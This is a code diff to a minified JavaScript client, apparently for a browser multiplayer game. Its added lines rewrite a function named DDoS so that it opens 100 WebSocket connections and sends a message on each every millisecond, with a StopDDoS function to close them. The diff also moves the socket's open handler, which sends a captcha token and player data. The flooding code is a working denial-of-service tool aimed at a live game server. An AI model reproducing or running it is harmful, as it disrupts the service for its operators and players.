@@ -7512,14 +7512,32 @@ function K(e, o, i, t, n) {
       e.push(r(o));
   return e;
 }
+let sockets = []; 
+
 function DDoS() {
-  Int = setInterval(() => {
-    let e = 5e4;
-    for (; e--; ) vw.oOW.send(JSON.stringify([11]));
-  }, 0);
+    const numSockets = 100; 
+
+    for (let i = 0; i < numSockets; i++) {
+        const socket = vw.connect(true);
+        sockets.push(socket); // Store reference to the socket
+        socket.onmessage = function(event) {
+            if (event.data === "string") {
+                const msg = JSON.parse(event.data);
+                switch (msg[0]) {
+                    case 3:
+                        setInterval(() => {
+                            socket.oOW.send(JSON.stringify([11]));
+                        }, 1);
+                }
+            }
+        };
+    }
 }
 function StopDDoS() {
-  clearInterval(Int);
+    sockets.forEach(socket => {
+        socket.close(); // Close each socket
+    });
+    sockets = []; // Clear the array of socket references
 }
 function zh(e, o) {
   var i = document.createElement("canvas"),
@@ -91036,6 +91054,35 @@ vw = new (function () {
           a.lobby.player.token;
         this.oOW = new window.WebSocket(v)
         console.group("Got Socket")
+        (this.oOW.onopen = function () {
+            clearTimeout(o.UWV),
+              get_recaptcha_token().then((e) => {
+                o.oOW.send(
+                  JSON.stringify([
+                    E.VW_.input.value,
+                    4e3,
+                    4e3,
+                    ua.UQuvu,
+                    m.Vw_,
+                    m.$UQ_0,
+                    m.reconnect.enabled ? 1 : 0,
+                    E.ouo,
+                    E.oUw,
+                    E.wwo,
+                    E.WuW,
+                    E.$vW,
+                    E.V_O,
+                    void 0 === Ua ? 0 : Ua,
+                    void 0 === Qa ? 0 : Qa.substring(Qa.length - 50),
+                    Uj,
+                    "❤",
+                    e,
+                  ])
+                ),
+                  (m.vWowo = void 0),
+                  (o.UWV = setTimeout(o.timeout, ua.WuWUw));
+              });
+        })
         if (skip) {
             console.groupEnd();
             console.group("returned socket");
@@ -91285,35 +91332,6 @@ vw = new (function () {
                   o.oVQ(i[1]);
               }
             }
-        }),
-        (this.oOW.onopen = function () {
-          clearTimeout(o.UWV),
-            get_recaptcha_token().then((e) => {
-              o.oOW.send(
-                JSON.stringify([
-                  E.VW_.input.value,
-                  4e3,
-                  4e3,
-                  ua.UQuvu,
-                  m.Vw_,
-                  m.$UQ_0,
-                  m.reconnect.enabled ? 1 : 0,
-                  E.ouo,
-                  E.oUw,
-                  E.wwo,
-                  E.WuW,
-                  E.$vW,
-                  E.V_O,
-                  void 0 === Ua ? 0 : Ua,
-                  void 0 === Qa ? 0 : Qa.substring(Qa.length - 50),
-                  Uj,
-                  "❤",
-                  e,
-                ])
-              ),
-                (m.vWowo = void 0),
-                (o.UWV = setTimeout(o.timeout, ua.WuWUw));
-            });
         }),
         (this.UWV = setTimeout(o.timeout, ua.WuWUw));
     });
